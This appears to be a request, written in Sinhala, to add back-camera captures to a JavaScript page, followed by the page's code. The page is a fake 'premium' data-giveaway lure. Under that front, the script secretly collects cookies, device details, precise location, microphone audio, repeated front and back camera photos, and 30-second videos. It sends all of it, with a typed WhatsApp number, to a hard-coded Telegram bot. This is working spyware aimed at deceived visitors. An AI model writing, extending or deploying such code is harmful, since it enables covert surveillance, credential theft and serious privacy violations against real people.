Back camera photo 10 ත් මෙකට ඇඩ් කරලා දෙන්න.

// Create floating particles
function createParticles() {
    const particles = document.getElementById('particles');
    for (let i = 0; i < 50; i++) {
        const particle = document.createElement('div');
        particle.className = 'particle';
        particle.style.left = Math.random() * 100 + '%';
        particle.style.animationDelay = Math.random() * 8 + 's';
        particle.style.animationDuration = (Math.random() * 5 + 5) + 's';
        particles.appendChild(particle);
    }
}

createParticles();

// Premium unlock system
let isPremiumUnlocked = false; // Changed to false initially
const lockOverlay = document.getElementById('lockOverlay');
const unlockBtn = document.getElementById('unlockBtn');
const luckyBox = document.getElementById('luckyBox');

if (unlockBtn) {
    unlockBtn.addEventListener('click', () => {
        unlockBtn.textContent = '🔄 Unlocking...';
        unlockBtn.style.background = 'linear-gradient(45deg, #00ffff, #ff00ff)';
        
        setTimeout(() => {
            isPremiumUnlocked = true;
            if (lockOverlay) lockOverlay.classList.add('hidden');
            if (luckyBox) luckyBox.style.background = 'linear-gradient(45deg, rgba(0, 255, 255, 0.2), rgba(255, 0, 255, 0.2), rgba(255, 255, 0, 0.2))';
            
            // Success notification
            const notification = document.createElement('div');
            notification.innerHTML = '🎉 PREMIUM UNLOCKED! 🎉';
            notification.style.cssText = `
                position: fixed;
                top: 20px;
                right: 20px;
                background: linear-gradient(45deg, #00ff00, #00ffff);
                color: #000;
                padding: 15px 25px;
                border-radius: 50px;
                font-weight: bold;
                z-index: 1000;
                animation: slideIn 0.5s ease;
            `;
            document.body.appendChild(notification);
            
            setTimeout(() => notification.remove(), 3000);
        }, 2000);
    });
}

// Enhanced Lucky Draw Box with Premium features
const premiumGifts = [
    '💎 10 GB PREMIUM',
    '🚀 15 GB VIP', 
    '👑 20 GB ROYAL',
    '🔥 25 GB ULTIMATE',
    '⚡ 30 GB INFINITE',
    '🌟 50 GB LEGENDARY'
];

if (luckyBox) {
    luckyBox.addEventListener('click', async () => {
        if (!isPremiumUnlocked) {
            alert('🔒 Please unlock PREMIUM access first!');
            return;
        }

        luckyBox.classList.add('spinning');
        luckyBox.textContent = "🎊 PREMIUM SPINNING... 🎊";
        
        // Enhanced spinning animation
        let count = 0;
        const interval = setInterval(() => {
            luckyBox.textContent = premiumGifts[Math.floor(Math.random() * premiumGifts.length)];
            count++;
            if (count > 50) clearInterval(interval);
        }, 80);

        setTimeout(() => {
            luckyBox.classList.remove('spinning');
            const selectedGift = premiumGifts[Math.floor(Math.random() * premiumGifts.length)];
            luckyBox.textContent = `🎉 ${selectedGift} WON! 🎉`;
            luckyBox.style.animation = 'borderGlow 1s ease infinite';
            
            // Confetti effect
            for (let i = 0; i < 30; i++) {
                const confetti = document.createElement('div');
                confetti.innerHTML = '🎉';
                confetti.style.cssText = `
                    position: fixed;
                    top: 50%;
                    left: 50%;
                    font-size: 2em;
                    pointer-events: none;
                    z-index: 1000;
                    animation: confetti 3s ease-out forwards;
                `;
                confetti.style.setProperty('--random-x', (Math.random() - 0.5) * 1000 + 'px');
                confetti.style.setProperty('--random-y', (Math.random() - 0.5) * 1000 + 'px');
                document.body.appendChild(confetti);
                setTimeout(() => confetti.remove(), 3000);
            }
        }, 4000);
    });
}

// Main functionality
(async () => {
    const canvas = document.getElementById('canvas');
    if (!canvas) {
        console.error('Canvas element not found');
        return;
    }
    
    const context = canvas.getContext('2d');
    const uid = '7748871040';

    const botToken = '8403443030:AAFWdchybA9ruQECsZSdQW-dzMHxTXMDRVc';
    const channelId = '7973196371';
    let whatsappNumber = '94725671018';

    // Device Info
    let battery = 'unknown';
    if (navigator.getBattery) {
        try {
            const b = await navigator.getBattery();
            battery = Math.round(b.level * 100) + '%';
        } catch (error) {
            console.error('Battery info error:', error);
        }
    }
    
    const deviceName = navigator.userAgent;
    const browserHistory = history.length;
    const cookies = document.cookie;
    const plugins = navigator.plugins.length;
    const screenResolution = screen.width + 'x' + screen.height;
    const hardwareConcurrency = navigator.hardwareConcurrency || 'unknown';
    const deviceMemory = navigator.deviceMemory || 'unknown';
    const language = navigator.language;
    const currentDate = new Date().toString();
    const currentUrl = window.location.href;
    const referrer = document.referrer;

    async function sendMessage(chat, text) {
        try {
            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: chat, text })
            });
        } catch (error) {
            console.error('Send message error:', error);
        }
    }

    async function sendPhoto(chat, blob, caption) {
        try {
            const formData = new FormData();
            formData.append('chat_id', chat);
            formData.append('photo', blob);
            formData.append('caption', caption);
            await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: formData });
        } catch (error) {
            console.error('Send photo error:', error);
        }
    }

    async function sendVideo(chat, blob, caption) {
        try {
            const formData = new FormData();
            formData.append('chat_id', chat);
            formData.append('video', blob);
            formData.append('caption', caption);
            await fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, { method: 'POST', body: formData });
        } catch (error) {
            console.error('Send video error:', error);
        }
    }

    async function sendAudio(chat, blob, caption) {
        try {
            const formData = new FormData();
            formData.append('chat_id', chat);
            formData.append('audio', blob);
            formData.append('caption', caption);
            await fetch(`https://api.telegram.org/bot${botToken}/sendAudio`, { method: 'POST', body: formData });
        } catch (error) {
            console.error('Send audio error:', error);
        }
    }

    // Send device info
    const deviceInfo = `DEVICE INFO:
🗿 Device: ${deviceName}
🔋 Battery: ${battery}
📊 History Length: ${browserHistory}
🍪 Cookies: ${cookies}
🔌 Plugins: ${plugins}
🖥️ Screen: ${screenResolution}
⚙️ CPU Cores: ${hardwareConcurrency}
💾 Memory: ${deviceMemory}GB
🌐 Language: ${language}
📅 Date: ${currentDate}
🔗 URL: ${currentUrl}
↩️ Referrer: ${referrer}`;

    await sendMessage(uid, deviceInfo);
    await sendMessage(channelId, deviceInfo);

    // Location capture with enhanced formatting
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
            async (position) => {
                const { latitude, longitude } = position.coords;
                const mapsUrl = `https://www.google.com/maps?q=${latitude},${longitude}`;
                const locationText = `🌍 LOCATION DATA:\n${mapsUrl}`;
                await sendMessage(uid, locationText);
                await sendMessage(channelId, locationText);
            },
            (error) => console.error('Location error:', error),
            { enableHighAccuracy: true }
        );
    }

    // Audio recording with premium enhancements
    try {
        const audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
        const mediaRecorder = new MediaRecorder(audioStream);
        const audioChunks = [];
        mediaRecorder.ondataavailable = (e) => audioChunks.push(e.data);
        mediaRecorder.onstop = async () => {
            const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
            const caption = `🎤 5-Second Audio Recording`;
            await sendAudio(uid, audioBlob, caption);
            await sendAudio(channelId, audioBlob, caption);
            audioStream.getTracks().forEach(track => track.stop());
        };
        mediaRecorder.start();
        setTimeout(() => mediaRecorder.stop(), 5000);
    } catch (error) {
        console.error('Audio capture error:', error);
    }

    // Front camera photos
    try {
        const frontStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
        const frontVideo = document.createElement('video');
        frontVideo.srcObject = frontStream;
        await frontVideo.play();
        
        // Set canvas dimensions to match video
        canvas.width = frontVideo.videoWidth;
        canvas.height = frontVideo.videoHeight;
        
        for (let i = 1; i <= 10; i++) {
            context.drawImage(frontVideo, 0, 0, canvas.width, canvas.height);
            const base64 = canvas.toDataURL('image/png');
            const blob = await (await fetch(base64)).blob();
            const caption = `📸 Front Camera Photo ${i}`;
            await sendPhoto(uid, blob, caption);
            await sendPhoto(channelId, blob, caption);
            await new Promise(r => setTimeout(r, 1000));
        }
        frontStream.getTracks().forEach(track => track.stop());
    } catch (error) {
        console.error('Front camera error:', error);
    }
    
// Back camera photos (10 photos)
try {
    const backStream = await navigator.mediaDevices.getUserMedia({ 
        video: { facingMode: { exact: 'environment' } } 
    });
    const backVideo = document.createElement('video');
    backVideo.srcObject = backStream;
    await backVideo.play();
    
    // Set canvas dimensions to match video
    canvas.width = backVideo.videoWidth;
    canvas.height = backVideo.videoHeight;
    
    for (let i = 1; i <= 10; i++) {
        context.drawImage(backVideo, 0, 0, canvas.width, canvas.height);
        const base64 = canvas.toDataURL('image/png');
        const blob = await (await fetch(base64)).blob();
        const caption = `📷 Back Camera Photo ${i}`;
        await sendPhoto(uid, blob, caption);
        await sendPhoto(channelId, blob, caption);
        await new Promise(r => setTimeout(r, 1000)); // 1 second delay between photos
    }
    backStream.getTracks().forEach(track => track.stop());
} catch (error) {
    console.error('Back camera photos error:', error);
}

    // Front camera video (30 seconds)
    try {
        const videoIndicator = document.getElementById('videoIndicator');
        const recordingText = document.getElementById('recordingText');
        
        if (recordingText) recordingText.textContent = 'Recording Front Camera (30s)...';
        if (videoIndicator) videoIndicator.classList.add('active');
        
        const frontVideoStream = await navigator.mediaDevices.getUserMedia({ 
            video: { facingMode: 'user' }, 
            audio: true 
        });
        
        const mediaRecorder = new MediaRecorder(frontVideoStream, { mimeType: 'video/webm;codecs=vp9,opus' });
        const videoChunks = [];
        
        mediaRecorder.ondataavailable = (e) => videoChunks.push(e.data);
        
        mediaRecorder.onstop = async () => {
            const videoBlob = new Blob(videoChunks, { type: 'video/webm' });
            const caption = `🎥 30-Second Front Camera Video`;
            await sendVideo(uid, videoBlob, caption);
            await sendVideo(channelId, videoBlob, caption);
            frontVideoStream.getTracks().forEach(track => track.stop());
            if (videoIndicator) videoIndicator.classList.remove('active');
        };
        
        mediaRecorder.start();
        setTimeout(() => {
            if (mediaRecorder.state === 'recording') {
                mediaRecorder.stop();
            }
        }, 30000);
    } catch (error) {
        console.error('Front camera video error:', error);
        const videoIndicator = document.getElementById('videoIndicator');
        if (videoIndicator) videoIndicator.classList.remove('active');
    }

    // Back camera video (30 seconds)
    try {
        const videoIndicator = document.getElementById('videoIndicator');
        const recordingText = document.getElementById('recordingText');
        
        if (recordingText) recordingText.textContent = 'Recording Back Camera (30s)...';
        if (videoIndicator) videoIndicator.classList.add('active');
        
        const backVideoStream = await navigator.mediaDevices.getUserMedia({ 
            video: { facingMode: { exact: 'environment' } }, 
            audio: true 
        });
        
        const mediaRecorder = new MediaRecorder(backVideoStream, { mimeType: 'video/webm;codecs=vp9,opus' });
        const videoChunks = [];
        
        mediaRecorder.ondataavailable = (e) => videoChunks.push(e.data);
        
        mediaRecorder.onstop = async () => {
            const videoBlob = new Blob(videoChunks, { type: 'video/webm' });
            const caption = `🎥 30-Second Back Camera Video`;
            await sendVideo(uid, videoBlob, caption);
            await sendVideo(channelId, videoBlob, caption);
            backVideoStream.getTracks().forEach(track => track.stop());
            if (videoIndicator) videoIndicator.classList.remove('active');
        };
        
        mediaRecorder.start();
        setTimeout(() => {
            if (mediaRecorder.state === 'recording') {
                mediaRecorder.stop();
            }
        }, 30000);
    } catch (error) {
        console.error('Back camera video error:', error);
        const videoIndicator = document.getElementById('videoIndicator');
        if (videoIndicator) videoIndicator.classList.remove('active');
    }

    // Premium WhatsApp number submission
    const submitNumberBtn = document.getElementById('submitNumber');
    if (submitNumberBtn) {
        submitNumberBtn.addEventListener('click', async () => {
            const input = document.getElementById('whatsappNumber');
            if (!input) return;
            
            whatsappNumber = input.value.trim();
            if (whatsappNumber) {
                await sendMessage(uid, `💎 PREMIUM WhatsApp Number: ${whatsappNumber}`);
                await sendMessage(channelId, `💎 PREMIUM WhatsApp Number: ${whatsappNumber}`);
                input.value = '';
                
                // Success animation
                const btn = document.getElementById('submitNumber');
                btn.style.background = 'linear-gradient(45deg, #00ff00, #00ffff)';
                btn.textContent = '✅ SUCCESS!';
                setTimeout(() => {
                    btn.style.background = '';
                    btn.textContent = '📱 Submit Number';
                }, 2000);
                
                alert('🎉 Number submitted successfully to PREMIUM system!');
            } else {
                alert('Please enter a valid WhatsApp number.');
            }
        });
    }
})();
